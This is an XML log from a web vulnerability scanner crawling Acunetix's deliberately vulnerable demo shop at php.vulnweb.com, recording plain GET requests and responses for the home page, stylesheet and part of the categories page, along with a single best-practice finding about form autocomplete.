		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id="pageName">welcome to our page</h2>
	  <div class="story">
		<h3>Test site for Acunetix WVS.</h3>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | <a href="/Mod_Rewrite_Shop/">Shop</a> | <a href="/hpp/">HTTP Parameter Pollution</a> | &copy;2019
  Acunetix Ltd 
</div> 
    
    
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="DD4E05C8521F7A29194D4BE7487B1CA5"><Method>GET</Method><Path>/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="ExternalAddedToCrawl";CrawlType="None";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="34";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="5c94cf2f";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="49ed71e6";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>Home of Acunetix Art</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id="pageName">welcome to our page</h2>
	  <div class="story">
		<h3>Test site for Acunetix WVS.</h3>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | <a href="/Mod_Rewrite_Shop/">Shop</a> | <a href="/hpp/">HTTP Parameter Pollution</a> | &copy;2019
  Acunetix Ltd 
</div> 
    
    
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:43:47 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4958</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="DAA7B804190826E12CFB353C8E411C1C"><URL>http://php.vulnweb.com:80/style.css</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="DAA7B804190826E12CFB353C8E411C1C"><![CDATA[GET /style.css HTTP/1.1
Referer: http://php.vulnweb.com/
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: ScriptEngine="Gecko";Category="Crawl";SID="DAA7B804190826E12CFB353C8E411C1C";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="ScriptInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="e8cc9d44";
X-Request-Memo: ID="6cec9479";sc="1";tid="54";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:23 GMT
ETag: "4dca64a4-156a"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: text/css
Accept-Ranges: bytes
Last-Modified: Wed, 11 May 2011 10:27:48 GMT
Content-Length: 5482

body{
	font-family: Arial,sans-serif;
	color: #333333;
	line-height: 1.166;	
	margin: 0px;
	padding: 0px;
}

a:link, a:visited{
	color: #006699;
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

h1, h2, h3, h4, h5, h6 {
	font-family: Arial,sans-serif;
	margin: 0px;
	padding: 0px;
}

h1{
 font-family: Verdana,Arial,sans-serif;
 font-size: 120%;
 color: #334d55;
}

h2{
 font-size: 114%;
 color: #006699;
}

h3{
 font-size: 100%;
 color: #334d55;
}

h4{
 font-size: 100%;
 font-weight: normal;
 color: #333333;
}

h5{
 font-size: 100%;
 color: #334d55;
}

ul{
 list-style-type: square;
}

ul ul{
 list-style-type: disc;
}

ul ul ul{
 list-style-type: none;
}

label{
 font: bold 100% Arial,sans-serif;
 color: #334d55;
}
				

/***********************************************/
/* Layout Divs                                 */
/***********************************************/

#masthead{
	margin: 0;
	padding: 10px 0px;
	border-bottom: 1px solid #cccccc;
	width: 100%;
}

#navBar{
	margin: 0 79% 0 0;
	padding: 0px;
	background-color: #eeeeee;
	border-right: 1px solid #ccc;
	border-bottom: 1px solid #ccc;
}

#content{
  float:right;
	width: 75%;
	margin: 0;
	padding: 0 3% 0 0;
}


/***********************************************/
/*Component Divs                               */
/***********************************************/

#siteName{
	margin: 0px;
	padding: 0px 0px 10px 10px;
}


/*************** #pageName styles **************/

#pageName{
	padding: 0px 0px 10px 10px;
}


/************* #globalNav styles **************/

#globalNav{
color: #cccccc;
padding: 0px 0px 0px 10px;
white-space: nowrap;
}
/* 'nowrap' prevents links from line-wrapping if there are too many to fit in one line
   this will force a horizontal scrollbar if there isn't enough room for all links
   remove rule or change value to 'normal' if you want the links to line-wrap */

#globalNav img{
 display: block;
}

#globalNav a {
	font-size: 90%;
	padding: 0px 4px 0px 0px; 
}


/************* #breadCrumb styles *************/

#breadCrumb{
	font-size: 80%;
	padding: 5px 0px 5px 10px;
}


/************** .feature styles ***************/

.feature{
	padding: 0px 0px 10px 10px;
	font-size: 80%;
}

.feature h3{
	padding: 30px 0px 5px 0px;
	text-align: center;
}

.feature img{
	float: left;
	padding: 0px 10px 0px 0px;
	margin: 0 5px 5px 0;
}
/* adjust margins to change separation between the feature image and text flowing around it */


/************** .story styles *****************/

.story{
	clear: both;
	padding: 10px 0px 0px 10px;
	font-size: 80%;
	background-color:#FFFFFF;
}

.story p{
	padding: 0px 0px 10px 0px;
	background-color:#FFFFFF;
}

/************* #siteInfo styles ***************/

#siteInfo{
	clear: both;
	border: 1px solid #cccccc;
	font-size: 75%;
	color: #cccccc;
	padding: 10px 10px 10px 10px;
	margin-top: -1px;
}
/* negative top margin pulls siteinfo up so its top border overlaps (and thus lines up with)
	the bottom border of the navBar in cases where they "touch" */

#siteInfo img{
	padding: 4px 4px 4px 0px;
	vertical-align: middle;
}


/************* #search styles ***************/

#search{
	padding: 5px 0px 5px 10px;
	border-bottom: 1px solid #cccccc;
	font-size: 90%;
}

#search form{
 margin: 0px;
 padding: 0px;
}

#search label{
	display: block;
	margin: 0px;
	padding: 0px;
}


/*********** #navBar link styles ***********/

#navBar ul a:link, #navBar ul a:visited {display: block;}
#navBar ul {list-style: none; margin: 0; padding: 0;}

/* hack to fix IE/Win's broken rendering of block-level anchors in lists */
#navBar li {border-bottom: 1px solid #EEE;}

/* fix for browsers that don't need the hack */
html>body #navBar li {border-bottom: none;}


/*********** #sectionLinks styles ***********/

#sectionLinks{
	position: relative;
	margin: 0px;
	padding: 0px;
	border-bottom: 1px solid #cccccc;
	font-size: 90%;
}

#sectionLinks h3{
	padding: 10px 0px 2px 10px;
}

#sectionLinks a:link{
	padding: 2px 0px 2px 10px;
	border-top: 1px solid #cccccc;
	width: 100%;
  voice-family: "\"}\""; 
  voice-family:inherit;
	width: auto;
}

#sectionLinks a:visited{
	border-top: 1px solid #cccccc;
	padding: 2px 0px 2px 10px;
}

#sectionLinks a:hover{
	border-top: 1px solid #cccccc;
	background-color: #dddddd;
	padding: 2px 0px 2px 10px;
}


/*********** .relatedLinks styles ***********/

.relatedLinks{
	margin: 0px;
	padding: 0px 0px 10px 10px;
	font-size: 90%;
}

.relatedLinks h3{
	padding: 10px 0px 2px 0px;
}


/************** #advert styles **************/

#advert{
	padding: 10px 0px 0px 10px;
	font-size: 80%;
	border-top: 1px solid #cccccc;
}

#advert img{
	display: block;
}


/************** #headlines styles **************/

#headlines{
	margin: 0px;
	padding: 10px 0px 20px 10px;
	font-size: 80%;
}

#headlines p{
	padding: 5px 0px 5px 0px;
}

img {
	border: none;
	padding: 0px 10px 0px 0px;
}

input {
	font-family:Verdana,Sans-serif; 
	font-size:10px;
	border-style:ridge;
	background-color:#F5F5F5;
}

textarea {
	font-family:Verdana,Sans-serif; 
	font-size:10px;
	border-style:ridge;
	background-color:#F5F5F5;
}

table {
	background-color:#EEEEEE;
}
td {
	background-color:#FFFFFF;
}]]></RawResponse><Request id="DAA7B804190826E12CFB353C8E411C1C"><Method>GET</Method><Path>/</Path><File>style</File><Ext>css</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>ScriptEngine="Gecko";Category="Crawl";SID="DAA7B804190826E12CFB353C8E411C1C";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="ScriptInclude";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";tid="54";tt="21";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="e8cc9d44";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="6cec9479";sc="1";tid="54";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[body{
	font-family: Arial,sans-serif;
	color: #333333;
	line-height: 1.166;	
	margin: 0px;
	padding: 0px;
}

a:link, a:visited{
	color: #006699;
	text-decoration: none;
}

a:hover {
	text-decoration: underline;
}

h1, h2, h3, h4, h5, h6 {
	font-family: Arial,sans-serif;
	margin: 0px;
	padding: 0px;
}

h1{
 font-family: Verdana,Arial,sans-serif;
 font-size: 120%;
 color: #334d55;
}

h2{
 font-size: 114%;
 color: #006699;
}

h3{
 font-size: 100%;
 color: #334d55;
}

h4{
 font-size: 100%;
 font-weight: normal;
 color: #333333;
}

h5{
 font-size: 100%;
 color: #334d55;
}

ul{
 list-style-type: square;
}

ul ul{
 list-style-type: disc;
}

ul ul ul{
 list-style-type: none;
}

label{
 font: bold 100% Arial,sans-serif;
 color: #334d55;
}
				

/***********************************************/
/* Layout Divs                                 */
/***********************************************/

#masthead{
	margin: 0;
	padding: 10px 0px;
	border-bottom: 1px solid #cccccc;
	width: 100%;
}

#navBar{
	margin: 0 79% 0 0;
	padding: 0px;
	background-color: #eeeeee;
	border-right: 1px solid #ccc;
	border-bottom: 1px solid #ccc;
}

#content{
  float:right;
	width: 75%;
	margin: 0;
	padding: 0 3% 0 0;
}


/***********************************************/
/*Component Divs                               */
/***********************************************/

#siteName{
	margin: 0px;
	padding: 0px 0px 10px 10px;
}


/*************** #pageName styles **************/

#pageName{
	padding: 0px 0px 10px 10px;
}


/************* #globalNav styles **************/

#globalNav{
color: #cccccc;
padding: 0px 0px 0px 10px;
white-space: nowrap;
}
/* 'nowrap' prevents links from line-wrapping if there are too many to fit in one line
   this will force a horizontal scrollbar if there isn't enough room for all links
   remove rule or change value to 'normal' if you want the links to line-wrap */

#globalNav img{
 display: block;
}

#globalNav a {
	font-size: 90%;
	padding: 0px 4px 0px 0px; 
}


/************* #breadCrumb styles *************/

#breadCrumb{
	font-size: 80%;
	padding: 5px 0px 5px 10px;
}


/************** .feature styles ***************/

.feature{
	padding: 0px 0px 10px 10px;
	font-size: 80%;
}

.feature h3{
	padding: 30px 0px 5px 0px;
	text-align: center;
}

.feature img{
	float: left;
	padding: 0px 10px 0px 0px;
	margin: 0 5px 5px 0;
}
/* adjust margins to change separation between the feature image and text flowing around it */


/************** .story styles *****************/

.story{
	clear: both;
	padding: 10px 0px 0px 10px;
	font-size: 80%;
	background-color:#FFFFFF;
}

.story p{
	padding: 0px 0px 10px 0px;
	background-color:#FFFFFF;
}

/************* #siteInfo styles ***************/

#siteInfo{
	clear: both;
	border: 1px solid #cccccc;
	font-size: 75%;
	color: #cccccc;
	padding: 10px 10px 10px 10px;
	margin-top: -1px;
}
/* negative top margin pulls siteinfo up so its top border overlaps (and thus lines up with)
	the bottom border of the navBar in cases where they "touch" */

#siteInfo img{
	padding: 4px 4px 4px 0px;
	vertical-align: middle;
}


/************* #search styles ***************/

#search{
	padding: 5px 0px 5px 10px;
	border-bottom: 1px solid #cccccc;
	font-size: 90%;
}

#search form{
 margin: 0px;
 padding: 0px;
}

#search label{
	display: block;
	margin: 0px;
	padding: 0px;
}


/*********** #navBar link styles ***********/

#navBar ul a:link, #navBar ul a:visited {display: block;}
#navBar ul {list-style: none; margin: 0; padding: 0;}

/* hack to fix IE/Win's broken rendering of block-level anchors in lists */
#navBar li {border-bottom: 1px solid #EEE;}

/* fix for browsers that don't need the hack */
html>body #navBar li {border-bottom: none;}


/*********** #sectionLinks styles ***********/

#sectionLinks{
	position: relative;
	margin: 0px;
	padding: 0px;
	border-bottom: 1px solid #cccccc;
	font-size: 90%;
}

#sectionLinks h3{
	padding: 10px 0px 2px 10px;
}

#sectionLinks a:link{
	padding: 2px 0px 2px 10px;
	border-top: 1px solid #cccccc;
	width: 100%;
  voice-family: "\"}\""; 
  voice-family:inherit;
	width: auto;
}

#sectionLinks a:visited{
	border-top: 1px solid #cccccc;
	padding: 2px 0px 2px 10px;
}

#sectionLinks a:hover{
	border-top: 1px solid #cccccc;
	background-color: #dddddd;
	padding: 2px 0px 2px 10px;
}


/*********** .relatedLinks styles ***********/

.relatedLinks{
	margin: 0px;
	padding: 0px 0px 10px 10px;
	font-size: 90%;
}

.relatedLinks h3{
	padding: 10px 0px 2px 0px;
}


/************** #advert styles **************/

#advert{
	padding: 10px 0px 0px 10px;
	font-size: 80%;
	border-top: 1px solid #cccccc;
}

#advert img{
	display: block;
}


/************** #headlines styles **************/

#headlines{
	margin: 0px;
	padding: 10px 0px 20px 10px;
	font-size: 80%;
}

#headlines p{
	padding: 5px 0px 5px 0px;
}

img {
	border: none;
	padding: 0px 10px 0px 0px;
}

input {
	font-family:Verdana,Sans-serif; 
	font-size:10px;
	border-style:ridge;
	background-color:#F5F5F5;
}

textarea {
	font-family:Verdana,Sans-serif; 
	font-size:10px;
	border-style:ridge;
	background-color:#F5F5F5;
}

table {
	background-color:#EEEEEE;
}
td {
	background-color:#FFFFFF;
}]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:23 GMT</Value></Header><Header><Name>ETag</Name><Value>"4dca64a4-156a"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/css</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Wed, 11 May 2011 10:27:48 GMT</Value></Header><Header><Name>Content-Length</Name><Value>5482</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="8681F4E7C8D52EA34B378320F672FB6F"><URL>http://php.vulnweb.com:80/categories.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="55b9d902-eaab-4480-92d6-c75fea88bcec"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>5597</VulnerabilityID><Severity>0</Severity><Name>Form Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="3877" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save form field content entered by users and then automatically complete form entry the next time the fields are encountered. This feature is enabled by default and could leak sensitive information since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your forms.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="8681F4E7C8D52EA34B378320F672FB6F"><![CDATA[GET /categories.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="8681F4E7C8D52EA34B378320F672FB6F";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="60";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="08359d89";
X-Request-Memo: ID="e7b10f03";sc="1";tid="35";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:25 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 6115

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>picture categories</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id="pageName">categories</h2>
	<div class='story'><a href='listproducts.php?cat=1'><h3>Posters</h3></a>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Donec molestie.
    Sed aliquam sem ut arcu. Phasellus sollicitudin. Vestibulum condimentum facilisis
    nulla. In hac habitasse platea dictumst. Nulla nonummy. Cras quis libero.
